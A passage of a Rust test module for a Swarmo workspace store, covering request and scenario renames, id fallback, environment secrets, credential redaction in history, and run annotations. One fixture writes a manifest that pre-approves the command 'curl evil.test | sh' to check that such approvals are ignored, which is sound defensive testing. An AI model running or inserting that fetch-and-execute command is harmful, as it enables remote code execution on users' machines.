        // No id to fall back on: this is a scenario written before ids
        // existed, which is what is sitting in real workspaces.
        assert!(store.get_scenario(&sref).unwrap().steps[0]
            .request_id
            .is_none());

        let moved = store.rename_request(&req, "Fetch user").unwrap();

        // The stored path is updated, so the editor finds the request rather
        // than showing "request not found" for one that is right there.
        let after = store.get_scenario(&sref).unwrap();
        assert_eq!(after.steps[0].request_ref, moved);
        assert!(
            after.steps[0].request_id.is_some(),
            "the id should be captured on the way past"
        );
        drop(tmp);
    }

    #[test]
    fn moving_a_request_repoints_the_scenarios_that_use_it() {
        let (tmp, store) = ws();
        let from = store.create_collection("From").unwrap();
        let to = store.create_collection("To").unwrap();
        let req = store.create_request(&from, "Get user").unwrap();
        let sref = write_legacy_scenario(&store, "smoke", &req);

        let moved = store.move_request(&req, &to).unwrap();
        assert_eq!(
            store.get_scenario(&sref).unwrap().steps[0].request_ref,
            moved
        );
        drop(tmp);
    }

    #[test]
    fn repointing_leaves_other_steps_and_scenarios_alone() {
        let (tmp, store) = ws();
        let coll = store.create_collection("C").unwrap();
        let a = store.create_request(&coll, "First").unwrap();
        let b = store.create_request(&coll, "Second").unwrap();

        let touched = write_legacy_scenario(&store, "uses-a", &a);
        let untouched = write_legacy_scenario(&store, "uses-b", &b);

        let moved = store.rename_request(&a, "First renamed").unwrap();

        assert_eq!(
            store.get_scenario(&touched).unwrap().steps[0].request_ref,
            moved
        );
        // A scenario that never referenced the renamed request must not be
        // rewritten at all.
        let other = store.get_scenario(&untouched).unwrap();
        assert_eq!(other.steps[0].request_ref, b);
        assert!(
            other.steps[0].request_id.is_none(),
            "an untouched file was rewritten"
        );
        drop(tmp);
    }

    #[test]
    fn a_tree_node_carries_the_request_id() {
        let (tmp, store) = ws();
        let coll = store.create_collection("C").unwrap();
        let req = store.create_request(&coll, "Get user").unwrap();
        let id = store.get_request(&req).unwrap().id;

        let tree = store.tree().unwrap();
        let node = &tree[0].children[0];
        assert_eq!(node.id.as_deref(), Some(id.as_str()));
        // Containers have no id of their own.
        assert!(tree[0].id.is_none());
        drop(tmp);
    }

    #[test]
    fn saving_a_scenario_records_which_request_each_step_uses() {
        let (tmp, store) = ws();
        let coll = store.create_collection("C").unwrap();
        let req = store.create_request(&coll, "Get user").unwrap();

        let sref = store.create_scenario("smoke").unwrap();
        let mut sc = store.get_scenario(&sref).unwrap();
        sc.steps = vec![step(&req)];
        store.save_scenario(&sref, &sc).unwrap();

        // A step written without an id gets one, so the next rename is safe
        // even for scenarios built before ids existed.
        let saved = store.get_scenario(&sref).unwrap();
        let id = saved.steps[0]
            .request_id
            .clone()
            .expect("id was not filled in");
        assert_eq!(id, store.get_request(&req).unwrap().id);
        drop(tmp);
    }

    #[test]
    fn renaming_a_request_does_not_break_the_scenarios_using_it() {
        let (tmp, store) = ws();
        let coll = store.create_collection("C").unwrap();
        let req = store.create_request(&coll, "Get user").unwrap();

        let sref = store.create_scenario("smoke").unwrap();
        let mut sc = store.get_scenario(&sref).unwrap();
        sc.steps = vec![step(&req)];
        store.save_scenario(&sref, &sc).unwrap();

        let moved = store.rename_request(&req, "Fetch user").unwrap();

        // Renaming repoints the referrers, so the step reads correctly rather
        // than merely working behind a stale path.
        let saved = store.get_scenario(&sref).unwrap();
        assert_eq!(saved.steps[0].request_ref, moved);
        let (found, _) = store
            .locate_request(
                &saved.steps[0].request_ref,
                saved.steps[0].request_id.as_deref(),
            )
            .expect("the step should still resolve");
        assert_eq!(found, moved);
        drop(tmp);
    }

    #[test]
    fn a_stale_path_still_resolves_by_id() {
        let (tmp, store) = ws();
        let coll = store.create_collection("C").unwrap();
        let req = store.create_request(&coll, "Get user").unwrap();
        let id = store.get_request(&req).unwrap().id;

        let sref = store.create_scenario("smoke").unwrap();
        let mut sc = store.get_scenario(&sref).unwrap();
        sc.steps = vec![step(&req)];
        store.save_scenario(&sref, &sc).unwrap();

        // Simulate the file being moved outside Swarmo — with git, or an
        // editor — where nothing was around to repoint the referrers. This is
        // the case the id fallback exists for.
        let other = store.create_collection("Elsewhere").unwrap();
        let from = store.path_of(&req).unwrap();
        let to = store.path_of(&other).unwrap().join("Get user.req.json");
        fs::rename(&from, &to).unwrap();

        let saved = store.get_scenario(&sref).unwrap();
        assert_eq!(
            saved.steps[0].request_ref, req,
            "the stored path is now wrong"
        );
        let (found, found_id) = store
            .locate_request(
                &saved.steps[0].request_ref,
                saved.steps[0].request_id.as_deref(),
            )
            .expect("the id should find it anyway");
        assert_eq!(found, store.ref_of(&to).unwrap());
        assert_eq!(found_id, id);
        drop(tmp);
    }

    #[test]
    fn moving_a_request_to_another_collection_is_also_survivable() {
        let (tmp, store) = ws();
        let from = store.create_collection("From").unwrap();
        let to = store.create_collection("To").unwrap();
        let req = store.create_request(&from, "Get user").unwrap();

        let sref = store.create_scenario("smoke").unwrap();
        let mut sc = store.get_scenario(&sref).unwrap();
        sc.steps = vec![step(&req)];
        store.save_scenario(&sref, &sc).unwrap();

        let moved = store.move_request(&req, &to).unwrap();
        let saved = store.get_scenario(&sref).unwrap();
        let (found, _) = store
            .locate_request(
                &saved.steps[0].request_ref,
                saved.steps[0].request_id.as_deref(),
            )
            .unwrap();
        assert_eq!(found, moved);
        drop(tmp);
    }

    #[test]
    fn saving_a_scenario_again_repairs_the_stale_path() {
        let (tmp, store) = ws();
        let coll = store.create_collection("C").unwrap();
        let req = store.create_request(&coll, "Get user").unwrap();
        let sref = store.create_scenario("smoke").unwrap();
        let mut sc = store.get_scenario(&sref).unwrap();
        sc.steps = vec![step(&req)];
        store.save_scenario(&sref, &sc).unwrap();

        let moved = store.rename_request(&req, "Fetch user").unwrap();
        // The file stays readable: the next save writes the current path back,
        // so the JSON does not stay misleading forever.
        let stale = store.get_scenario(&sref).unwrap();
        store.save_scenario(&sref, &stale).unwrap();
        assert_eq!(
            store.get_scenario(&sref).unwrap().steps[0].request_ref,
            moved
        );
        drop(tmp);
    }

    #[test]
    fn a_deleted_request_leaves_the_step_untouched_rather_than_erased() {
        let (tmp, store) = ws();
        let coll = store.create_collection("C").unwrap();
        let req = store.create_request(&coll, "Get user").unwrap();
        let sref = store.create_scenario("smoke").unwrap();
        let mut sc = store.get_scenario(&sref).unwrap();
        sc.steps = vec![step(&req)];
        store.save_scenario(&sref, &sc).unwrap();

        store.delete_node(&req).unwrap();
        let stale = store.get_scenario(&sref).unwrap();
        store.save_scenario(&sref, &stale).unwrap();

        // Rewriting a step whose target is gone would destroy the only record
        // of what it pointed at, leaving nothing to diagnose.
        let after = store.get_scenario(&sref).unwrap();
        assert_eq!(after.steps[0].request_ref, req);
        assert!(after.steps[0].request_id.is_some());
        assert!(store
            .locate_request(
                &after.steps[0].request_ref,
                after.steps[0].request_id.as_deref()
            )
            .is_err());
        drop(tmp);
    }

    #[test]
    fn a_name_collision_does_not_fool_the_lookup() {
        let (tmp, store) = ws();
        let a = store.create_collection("A").unwrap();
        let b = store.create_collection("B").unwrap();
        let original = store.create_request(&a, "Get user").unwrap();

        let sref = store.create_scenario("smoke").unwrap();
        let mut sc = store.get_scenario(&sref).unwrap();
        sc.steps = vec![step(&original)];
        store.save_scenario(&sref, &sc).unwrap();
        let id = store.get_scenario(&sref).unwrap().steps[0]
            .request_id
            .clone()
            .unwrap();

        // Move the real one away, then put a different request with the same
        // name where it used to be. The path now points at an impostor.
        let moved = store.move_request(&original, &b).unwrap();
        let impostor = store.create_request(&a, "Get user").unwrap();
        assert_ne!(store.get_request(&impostor).unwrap().id, id);

        let saved = store.get_scenario(&sref).unwrap();
        let (found, found_id) = store
            .locate_request(
                &saved.steps[0].request_ref,
                saved.steps[0].request_id.as_deref(),
            )
            .unwrap();
        assert_eq!(found, moved, "the id must win over a same-named file");
        assert_eq!(found_id, id);
        drop(tmp);
    }

    #[test]
    fn a_scenario_keeps_its_id_across_a_rename() {
        let (tmp, store) = ws();
        let sref = store.create_scenario("smoke").unwrap();
        let id = store.get_scenario(&sref).unwrap().id;

        let moved = store.rename_load_test(&sref, "nightly").unwrap();
        assert_eq!(store.get_scenario(&moved).unwrap().id, id);
        // And a run that recorded the old path still finds it.
        assert_eq!(store.locate_load_test(&sref, Some(&id)), Some(moved));
        drop(tmp);
    }

    #[test]
    fn a_duplicated_scenario_is_a_different_scenario() {
        let (tmp, store) = ws();
        let sref = store.create_scenario("smoke").unwrap();
        let id = store.get_scenario(&sref).unwrap().id;

        let copy = store.duplicate_load_test(&sref).unwrap();
        let copied = store.get_scenario(&copy).unwrap();
        assert_ne!(copy, sref);
        assert_eq!(copied.name, "smoke copy");
        // Sharing an id would make runs of one look like runs of the other.
        assert_ne!(copied.id, id);
        drop(tmp);
    }

    #[test]
    fn a_duplicated_user_script_keeps_its_body() {
        let (tmp, store) = ws();
        let sref = store
            .create_user_script("shopper", "export default () => 1")
            .unwrap();
        let copy = store.duplicate_load_test(&sref).unwrap();
        assert_ne!(copy, sref);
        assert_eq!(store.read_text(&copy).unwrap(), "export default () => 1");
        assert_eq!(store.list_load_tests().unwrap().len(), 2);
        drop(tmp);
    }

    #[test]
    fn a_user_script_is_located_by_path_because_it_has_no_id() {
        let (tmp, store) = ws();
        let sref = store.create_user_script("shopper", "x").unwrap();
        assert_eq!(store.locate_load_test(&sref, None), Some(sref.clone()));
        // Renamed, there is nothing to find it by — which the caller has to be
        // able to tell apart from "it is still here".
        let moved = store.rename_load_test(&sref, "checkout").unwrap();
        assert_eq!(store.locate_load_test(&sref, None), None);
        assert_eq!(store.locate_load_test(&moved, None), Some(moved));
        drop(tmp);
    }

    // -- renaming ------------------------------------------------------------

    #[test]
    fn a_scenario_rename_moves_the_file_and_updates_the_name_inside_it() {
        let (tmp, store) = ws();
        let sref = store.create_scenario("smoke").unwrap();

        let moved = store.rename_load_test(&sref, "nightly soak").unwrap();
        assert_ne!(moved, sref, "the ref should follow the file");
        assert!(moved.ends_with(".load.json"));

        // The name lives in two places; both have to change or the sidebar and
        // the file disagree.
        let scenario = store.get_scenario(&moved).unwrap();
        assert_eq!(scenario.name, "nightly soak");
        assert!(store.get_scenario(&sref).is_err(), "the old file is gone");
        drop(tmp);
    }

    #[test]
    fn a_user_script_rename_keeps_its_contents() {
        let (tmp, store) = ws();
        let sref = store
            .create_user_script("shopper", "export default () => {}")
            .unwrap();

        let moved = store.rename_load_test(&sref, "checkout flow").unwrap();
        assert!(moved.ends_with(".user.js"));
        assert_eq!(
            store.read_text(&moved).unwrap(),
            "export default () => {}",
            "the script body must survive the move"
        );
        drop(tmp);
    }

    #[test]
    fn renaming_a_scenario_to_its_own_name_is_not_a_duplicate() {
        let (tmp, store) = ws();
        let sref = store.create_scenario("smoke").unwrap();

        // The file being renamed already exists, so a naive uniqueness check
        // would land this on "smoke 2".
        let same = store.rename_load_test(&sref, "smoke").unwrap();
        assert_eq!(same, sref);
        assert_eq!(store.list_load_tests().unwrap().len(), 1);
        drop(tmp);
    }

    #[test]
    fn a_rename_that_collides_gets_a_suffix_rather_than_overwriting() {
        let (tmp, store) = ws();
        let a = store.create_scenario("smoke").unwrap();
        let b = store.create_scenario("soak").unwrap();

        let moved = store.rename_load_test(&b, "smoke").unwrap();
        assert_ne!(moved, a, "the other scenario must not be overwritten");
        assert_eq!(store.list_load_tests().unwrap().len(), 2);
        // Both still readable.
        assert!(store.get_scenario(&a).is_ok());
        assert!(store.get_scenario(&moved).is_ok());
        drop(tmp);
    }

    #[test]
    fn renaming_a_request_to_its_own_name_is_not_a_duplicate() {
        let (tmp, store) = ws();
        let coll = store.create_collection("C").unwrap();
        let req = store.create_request(&coll, "Get user").unwrap();

        let same = store.rename_request(&req, "Get user").unwrap();
        assert_eq!(same, req);
        assert_eq!(store.get_request(&same).unwrap().name, "Get user");
        drop(tmp);
    }

    #[test]
    fn renaming_only_the_capitalisation_keeps_one_file() {
        let (tmp, store) = ws();
        let coll = store.create_collection("C").unwrap();
        let req = store.create_request(&coll, "Get User").unwrap();

        // On a case-insensitive filesystem this is the same file; writing the
        // new one and then deleting the old would delete both.
        let moved = store.rename_request(&req, "get user").unwrap();
        assert_eq!(
            store.get_request(&moved).unwrap().name,
            "get user",
            "the request should still be readable after a case-only rename"
        );
        let tree = store.tree().unwrap();
        let count = tree[0].children.len();
        assert_eq!(
            count, 1,
            "a case-only rename should not duplicate or delete"
        );
        drop(tmp);
    }

    #[test]
    fn an_environment_rename_carries_its_variables_and_secrets() {
        let (tmp, store) = ws();
        let mut env = Environment::new("staging");
        env.variables.push(EnvVariable {
            key: "baseUrl".into(),
            value: "https://staging.test".into(),
            secret: false,
            enabled: true,
        });
        env.variables.push(EnvVariable {
            key: "token".into(),
            value: "s3cret".into(),
            secret: true,
            enabled: true,
        });
        store.save_environment(&env).unwrap();

        store.rename_environment("staging", "pre-prod").unwrap();

        assert!(store.get_environment("staging").is_err());
        let moved = store.get_environment_with_secrets("pre-prod").unwrap();
        assert_eq!(moved.name, "pre-prod");
        // Secrets are keyed by environment name, so a rename that forgot them
        // would leave the values orphaned and the variable blank.
        let token = moved.variables.iter().find(|v| v.key == "token").unwrap();
        assert_eq!(token.value, "s3cret");
        let base = moved.variables.iter().find(|v| v.key == "baseUrl").unwrap();
        assert_eq!(base.value, "https://staging.test");
        drop(tmp);
    }

    #[test]
    fn approvals_in_a_shared_manifest_are_ignored_and_dropped() {
        // A manifest from before approvals moved out of the workspace, or one
        // written to pre-approve a command, must still open, grant nothing,
        // and lose the keys on the next save.
        let (tmp, store) = ws();
        let path = store.root().join(MANIFEST);
        fs::write(
            &path,
            r#"{"version":1,"name":"test","approvedLoadHosts":["prod.example.com"],
                "approvedAuthCommands":["curl evil.test | sh"]}"#,
        )
        .unwrap();

        store.set_active_environment(None).unwrap();

        let text = fs::read_to_string(&path).unwrap();
        assert!(!text.contains("approved"), "{text}");
        drop(tmp);
    }

    #[test]
    fn a_cookie_value_is_not_mistaken_for_an_auth_scheme() {
        let red = redact_secret("session=SUPERSECRETSESSIONTOKEN123; theme=dark");
        assert!(!red.contains("SUPERSECRET"), "{red}");
        // Head and tail together would be most of a short token.
        assert_eq!(redact_secret("Bearer abcdefghi"), "Bearer … (redacted)");
    }

    #[test]
    fn an_environment_cannot_silently_replace_one_sharing_its_file_name() {
        let (tmp, store) = ws();
        store.save_environment(&Environment::new("a:b")).unwrap();
        // "a:b" and "a_b" sanitise to the same file.
        assert!(store.save_environment(&Environment::new("a_b")).is_err());
        assert!(!store
            .list_environments()
            .unwrap()
            .contains(&"a_b".to_string()));
        drop(tmp);
    }

    #[test]
    fn deleting_an_environment_keeps_the_secrets_of_one_nested_under_its_name() {
        let (tmp, store) = ws();
        for name in ["prod", "prod/eu"] {
            let mut env = Environment::new(name);
            env.variables.push(EnvVariable {
                key: "token".into(),
                value: format!("{name}-secret"),
                secret: true,
                enabled: true,
            });
            store.save_environment(&env).unwrap();
        }

        store.delete_environment("prod").unwrap();

        let eu = store.get_environment_with_secrets("prod/eu").unwrap();
        assert_eq!(eu.variables[0].value, "prod/eu-secret");
        drop(tmp);
    }

    #[test]
    fn a_request_file_without_an_id_is_still_located_by_its_path() {
        let (tmp, store) = ws();
        let coll = store.create_collection("C").unwrap();
        let path = store.path_of(&coll).unwrap().join("noid.req.json");
        fs::write(&path, r#"{"name":"noid","url":"http://x"}"#).unwrap();
        let node_ref = format!("{coll}/noid.req.json");

        // Each read invents a fresh id, so the one recorded earlier never matches.
        let (found, _) = store.locate_request(&node_ref, Some("stale-id")).unwrap();
        assert_eq!(found, node_ref);
        drop(tmp);
    }

    #[test]
    fn an_environment_rename_follows_the_active_selection() {
        let (tmp, store) = ws();
        store
            .save_environment(&Environment::new("staging"))
            .unwrap();
        store
            .set_active_environment(Some("staging".to_string()))
            .unwrap();

        store.rename_environment("staging", "pre-prod").unwrap();

        assert_eq!(
            store.manifest().unwrap().active_environment.as_deref(),
            Some("pre-prod"),
            "renaming the active environment must not deselect it"
        );
        drop(tmp);
    }

    #[test]
    fn an_environment_rename_updates_the_scenarios_that_use_it() {
        let (tmp, store) = ws();
        store
            .save_environment(&Environment::new("staging"))
            .unwrap();
        store.save_environment(&Environment::new("other")).unwrap();

        let a = store.create_scenario("smoke").unwrap();
        let mut sa = store.get_scenario(&a).unwrap();
        sa.environment = Some("staging".into());
        store.save_scenario(&a, &sa).unwrap();

        let b = store.create_scenario("soak").unwrap();
        let mut sb = store.get_scenario(&b).unwrap();
        sb.environment = Some("other".into());
        store.save_scenario(&b, &sb).unwrap();

        store.rename_environment("staging", "pre-prod").unwrap();

        // A scenario pointing at a name that no longer exists would fail at
        // the next run, with nothing on screen to say why.
        assert_eq!(
            store.get_scenario(&a).unwrap().environment.as_deref(),
            Some("pre-prod")
        );
        // Scenarios using a different environment are left alone.
        assert_eq!(
            store.get_scenario(&b).unwrap().environment.as_deref(),
            Some("other")
        );
        drop(tmp);
    }

    #[test]
    fn an_environment_rename_refuses_to_overwrite_another() {
        let (tmp, store) = ws();
        store
            .save_environment(&Environment::new("staging"))
            .unwrap();
        store.save_environment(&Environment::new("prod")).unwrap();

        let err = store.rename_environment("staging", "prod").unwrap_err();
        assert!(err.to_string().contains("already exists"), "{err}");
        // Both survive.
        assert!(store.get_environment("staging").is_ok());
        assert!(store.get_environment("prod").is_ok());
        drop(tmp);
    }

    #[test]
    fn an_empty_name_is_refused_rather_than_creating_a_nameless_file() {
        let (tmp, store) = ws();
        let sref = store.create_scenario("smoke").unwrap();
        assert!(store.rename_load_test(&sref, "   ").is_err());
        store
            .save_environment(&Environment::new("staging"))
            .unwrap();
        assert!(store.rename_environment("staging", "").is_err());
        // Nothing was disturbed.
        assert_eq!(store.get_scenario(&sref).unwrap().name, "smoke");
        assert!(store.get_environment("staging").is_ok());
        drop(tmp);
    }

    #[test]
    fn history_round_trips() {
        let (tmp, store) = ws();
        assert!(store.load_history().is_empty());

        store
            .save_history(&[stub_entry("a"), stub_entry("b")])
            .unwrap();

        let got = store.load_history();
        assert_eq!(got.len(), 2);
        assert_eq!(got[0].id, "a");
        assert_eq!(got[0].request.headers.len(), 1);
        assert_eq!(got[0].request.body.as_deref(), Some("{}"));
        drop(tmp);
    }

    /// A history.json exactly as versions before response capture wrote it.
    const LEGACY_HISTORY_JSON: &str = r#"[
      {
        "id": "old-send",
        "requestRef": "collections/api/get.req.json",
        "name": "Get user",
        "protocol": "http",
        "method": "GET",
        "url": "https://example.test/users/1",
        "status": 200,
        "statusText": "OK",
        "durationMs": 12.5,
        "responseBytes": 480,
        "at": 1700000000000,
        "ok": true,
        "request": {
          "headers": [["accept", "application/json"]],
          "body": "{}",
          "bodyTruncated": false
        }
      }
    ]"#;

    #[test]
    fn history_written_before_responses_were_captured_still_loads() {
        let (tmp, store) = ws();
        let dir = store.root().join(INTERNAL_DIR);
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join(HISTORY_FILE), LEGACY_HISTORY_JSON).unwrap();

        let got = store.load_history();
        assert_eq!(got.len(), 1, "old history vanished");
        assert_eq!(got[0].id, "old-send");
        assert_eq!(got[0].request.body.as_deref(), Some("{}"));
        // The response simply was not recorded then; it reads as empty rather
        // than failing the whole file.
        assert!(got[0].response.body.is_none());
        assert!(got[0].response.headers.is_empty());
        drop(tmp);
    }

    #[test]
    fn credentials_are_not_written_to_history_in_full() {
        let sent = HistorySentRequest::new(
            vec![
                (
                    "Authorization".into(),
                    "Bearer eyJhbGciOiJSUzI1NiJ9.payload.signature".into(),
                ),
                ("Cookie".into(), "session=abcdef123456789".into()),
                ("Accept".into(), "application/json".into()),
            ],
            None,
        );

        let value = |k: &str| {
            sent.headers
                .iter()
                .find(|(n, _)| n.eq_ignore_ascii_case(k))
                .map(|(_, v)| v.clone())
                .unwrap()
        };

        // The scheme survives — it says what kind of credential this was —
        // but the secret does not.
        let auth = value("Authorization");
        assert!(auth.starts_with("Bearer "), "{auth}");
        assert!(auth.contains("(redacted)"), "{auth}");
        assert!(!auth.contains("payload"), "{auth}");
        assert!(value("Cookie").contains("(redacted)"));
        assert!(!value("Cookie").contains("abcdef123456789"));

        // Ordinary headers are untouched: redacting everything would make
        // history useless.
        assert_eq!(value("Accept"), "application/json");
    }

    #[test]
    fn a_short_credential_reveals_nothing_at_all() {
        // Keeping four characters either side of an eight-character secret
        // would be the whole secret.
        assert_eq!(redact_secret("abc123"), "… (redacted)");
        assert_eq!(redact_secret("Bearer abc123"), "Bearer … (redacted)");
    }

    #[test]
    fn response_credentials_are_redacted_too() {
        let res = HistoryResponse::new(
            vec![
                ("set-cookie".into(), "s=1".into()),
                ("authorization".into(), "Bearer verylongsecrettoken".into()),
            ],
            None,
        );
        let auth = &res
            .headers
            .iter()
            .find(|(k, _)| k == "authorization")
            .unwrap()
            .1;
        assert!(auth.contains("(redacted)"), "{auth}");
    }

    #[test]
    fn grpc_trailers_carrying_credentials_are_redacted() {
        // Trailers are namespaced with a "trailer:" prefix; the prefix must
        // not stop a credential from being recognised.
        let res = HistoryResponse::new(
            vec![(
                "trailer:authorization".into(),
                "Bearer verylongsecrettoken".into(),
            )],
            None,
        );
        assert!(res.headers[0].1.contains("(redacted)"), "{:?}", res.headers);
    }

    #[test]
    fn requests_and_responses_share_one_body_cap() {
        // Two caps that could drift would eventually disagree; they are the
        // same function, and this says so.
        let big = "x".repeat(MAX_HISTORY_BODY + 1_000);
        let req = HistorySentRequest::new(Vec::new(), Some(big.clone()));
        let res = HistoryResponse::new(Vec::new(), Some(big));
        assert!(req.body_truncated && res.body_truncated);
        assert_eq!(req.body.unwrap().len(), res.body.unwrap().len());
    }

    #[test]
    fn a_recorded_response_round_trips() {
        let (tmp, store) = ws();
        let mut e = stub_entry("a");
        e.response = HistoryResponse::new(
            vec![("content-type".into(), "application/json".into())],
            Some(r#"{"ok":true}"#.into()),
        );
        store.save_history(&[e]).unwrap();

        let got = store.load_history();
        assert_eq!(got[0].response.headers.len(), 1);
        assert_eq!(got[0].response.body.as_deref(), Some(r#"{"ok":true}"#));
        assert!(!got[0].response.body_truncated);
        drop(tmp);
    }

    #[test]
    fn history_is_capped_when_saved() {
        let (tmp, store) = ws();
        let entries: Vec<_> = (0..MAX_HISTORY + 25)
            .map(|i| stub_entry(&i.to_string()))
            .collect();
        store.save_history(&entries).unwrap();

        let got = store.load_history();
        assert_eq!(got.len(), MAX_HISTORY);
        // Newest first, so it is the tail that falls off.
        assert_eq!(got[0].id, "0");
        drop(tmp);
    }

    #[test]
    fn oversized_bodies_are_truncated_and_flagged() {
        let big = "x".repeat(MAX_HISTORY_BODY + 5_000);
        let sent = HistorySentRequest::new(Vec::new(), Some(big));
        assert!(sent.body_truncated);
        assert_eq!(sent.body.unwrap().len(), MAX_HISTORY_BODY);

        let small = HistorySentRequest::new(Vec::new(), Some("hello".into()));
        assert!(!small.body_truncated);
        assert_eq!(small.body.as_deref(), Some("hello"));
    }

    #[test]
    fn truncation_does_not_split_a_character() {
        // A multi-byte character straddling the cap must not produce invalid
        // UTF-8 — the body is cut back to the boundary instead.
        let body = "é".repeat(MAX_HISTORY_BODY);
        let sent = HistorySentRequest::new(Vec::new(), Some(body));
        assert!(sent.body_truncated);
        let out = sent.body.unwrap();
        assert!(out.len() <= MAX_HISTORY_BODY);
        assert!(out.chars().all(|c| c == 'é'));
    }

    #[test]
    fn clearing_history_removes_the_file() {
        let (tmp, store) = ws();
        store.save_history(&[stub_entry("a")]).unwrap();
        store.clear_history().unwrap();
        assert!(store.load_history().is_empty());
        // Clearing twice is not an error.
        store.clear_history().unwrap();
        drop(tmp);
    }

    #[test]
    fn corrupt_history_reads_as_empty() {
        let (tmp, store) = ws();
        store.save_history(&[stub_entry("a")]).unwrap();
        let p = store.root().join(INTERNAL_DIR).join(HISTORY_FILE);
        fs::write(&p, b"{ not json").unwrap();
        // A damaged log must never stop the workspace from opening.
        assert!(store.load_history().is_empty());
        drop(tmp);
    }

    #[test]
    fn run_annotation_round_trips() {
        let (tmp, store) = ws();
        store
            .save_run_summary(&stub_summary("r1", "smoke"))
            .unwrap();

        assert_eq!(store.get_run_annotation("r1"), RunAnnotation::default());

        store
            .save_run_annotation(
                "r1",
                RunAnnotation {
                    label: Some("  Baseline  ".into()),
                    notes: Some("2 instances".into()),
                },
            )
            .unwrap();

        let got = store.get_run_annotation("r1");
        // Surrounding whitespace is trimmed, so a name never renders padded.
        assert_eq!(got.label.as_deref(), Some("Baseline"));
        assert_eq!(got.notes.as_deref(), Some("2 instances"));
        drop(tmp);
    }

    #[test]
    fn blank_annotation_fields_are_cleared() {
        let (tmp, store) = ws();
        store
            .save_run_summary(&stub_summary("r1", "smoke"))
            .unwrap();
        store
            .save_run_annotation(
                "r1",
                RunAnnotation {
                    label: Some("Baseline".into()),
                    notes: Some("keep".into()),
                },
            )
            .unwrap();

        // Whitespace means "no name", not a name made of spaces.
        store
            .save_run_annotation(
                "r1",
                RunAnnotation {
                    label: Some("   ".into()),
                    notes: None,
                },
            )
            .unwrap();

        assert_eq!(store.get_run_annotation("r1"), RunAnnotation::default());
        assert!(!store.run_dir("r1").join(ANNOTATION_FILE).exists());
        drop(tmp);
    }

    #[test]
    fn annotation_survives_the_summary_being_rewritten() {
        let (tmp, store) = ws();
        store
            .save_run_summary(&stub_summary("r1", "smoke"))
            .unwrap();
        store
            .save_run_annotation(
                "r1",
                RunAnnotation {
                    label: Some("Baseline".into()),
                    notes: None,
                },
            )
            .unwrap();

        // A run annotated while live must keep its name when the engine writes
        // the final summary over the top.
        store
            .save_run_summary(&stub_summary("r1", "smoke"))
            .unwrap();

        assert_eq!(
            store.get_run_annotation("r1").label.as_deref(),
            Some("Baseline")
        );
        drop(tmp);
    }

    #[test]
    fn list_runs_carries_the_annotation() {
        let (tmp, store) = ws();
        store
            .save_run_summary(&stub_summary("r1", "smoke"))
            .unwrap();
        store.save_run_summary(&stub_summary("r2", "soak")).unwrap();
        store
            .save_run_annotation(
                "r1",
                RunAnnotation {
                    label: Some("Baseline".into()),
                    notes: Some("before the fix".into()),
                },
            )
            .unwrap();

        let runs = store.list_runs().unwrap();
        let r1 = runs.iter().find(|r| r.run_id == "r1").unwrap();
        let r2 = runs.iter().find(|r| r.run_id == "r2").unwrap();
        assert_eq!(r1.label.as_deref(), Some("Baseline"));
        assert!(r1.has_notes);
        assert_eq!(r2.label, None);
        assert!(!r2.has_notes);
        drop(tmp);
    }

    #[test]
    fn deleting_a_run_takes_its_annotation() {
        let (tmp, store) = ws();
        store
            .save_run_summary(&stub_summary("r1", "smoke"))
            .unwrap();
        store
            .save_run_annotation(
                "r1",
                RunAnnotation {
                    label: Some("Baseline".into()),
                    notes: None,
                },
            )
            .unwrap();
        store.delete_run("r1").unwrap();
        assert_eq!(store.get_run_annotation("r1"), RunAnnotation::default());
        drop(tmp);
    }

    #[test]
    fn create_and_reopen() {
        let (tmp, store) = ws();
        assert_eq!(store.manifest().unwrap().name, "test");
        let reopened = WorkspaceStore::open(store.root()).unwrap();
        assert_eq!(reopened.manifest().unwrap().name, "test");
        drop(tmp);
    }

    #[test]
    fn open_rejects_non_workspace() {
        let tmp = TempDir::new().unwrap();
        assert!(WorkspaceStore::open(tmp.path()).is_err());
    }

    #[test]
    fn collection_folder_request_roundtrip() {
        let (_t, store) = ws();
        let coll = store.create_collection("Orders API").unwrap();
        assert_eq!(coll, "collections/Orders API");
        let folder = store.create_folder(&coll, "Admin").unwrap();
        let req = store.create_request(&folder, "Delete Order").unwrap();
        assert_eq!(req, "collections/Orders API/Admin/Delete Order.req.json");

        let mut def = store.get_request(&req).unwrap();
        def.method = "DELETE".into();
        def.url = "{{baseUrl}}/orders/1".into();
        store.save_request(&req, &def).unwrap();
        assert_eq!(store.get_request(&req).unwrap().method, "DELETE");

        let tree = store.tree().unwrap();
        assert_eq!(tree.len(), 1);
        assert_eq!(tree[0].name, "Orders API");
        assert_eq!(tree[0].children[0].name, "Admin");
        assert_eq!(tree[0].children[0].children[0].name, "Delete Order");
        assert_eq!(
            tree[0].children[0].children[0].method.as_deref(),
            Some("DELETE")
        );
    }

    #[test]
    fn name_collisions_get_suffixed() {
        let (_t, store) = ws();
        let c = store.create_collection("C").unwrap();
        let a = store.create_request(&c, "Same").unwrap();
        let b = store.create_request(&c, "Same").unwrap();
        assert_ne!(a, b);
        assert!(b.ends_with("Same 2.req.json"));
    }

    #[test]
    fn rename_moves_file_and_updates_name() {
        let (_t, store) = ws();
        let c = store.create_collection("C").unwrap();
        let r = store.create_request(&c, "Old").unwrap();
        let r2 = store.rename_request(&r, "New").unwrap();
        assert!(r2.ends_with("New.req.json"));
        assert_eq!(store.get_request(&r2).unwrap().name, "New");
        assert!(store.get_request(&r).is_err());
    }

    #[test]
    fn move_request_between_folders() {
        let (_t, store) = ws();
        let c = store.create_collection("C").unwrap();
        let f = store.create_folder(&c, "F").unwrap();
        let r = store.create_request(&c, "R").unwrap();
        let moved = store.move_request(&r, &f).unwrap();
        assert_eq!(moved, "collections/C/F/R.req.json");
        assert!(store.get_request(&r).is_err());
    }

    #[test]
    fn secrets_are_stored_outside_the_committed_file() {
        let (_t, store) = ws();
        let mut env = Environment::new("prod");
        env.variables.push(EnvVariable {
            key: "apiKey".into(),
            value: "s3cret".into(),
            secret: true,
            enabled: true,
        });
        env.variables.push(EnvVariable {
            key: "baseUrl".into(),
            value: "https://x".into(),
            secret: false,
            enabled: true,
        });
        store.save_environment(&env).unwrap();

        let on_disk = store.get_environment("prod").unwrap();
        assert_eq!(on_disk.variables[0].value, "");
        assert_eq!(on_disk.variables[1].value, "https://x");

        let merged = store.get_environment_with_secrets("prod").unwrap();
        assert_eq!(merged.variables[0].value, "s3cret");

        let scope = store.var_scope(Some("prod")).unwrap();
        assert_eq!(scope.get("apiKey"), Some("s3cret"));
    }

    #[test]
    fn deleting_environment_purges_secrets() {
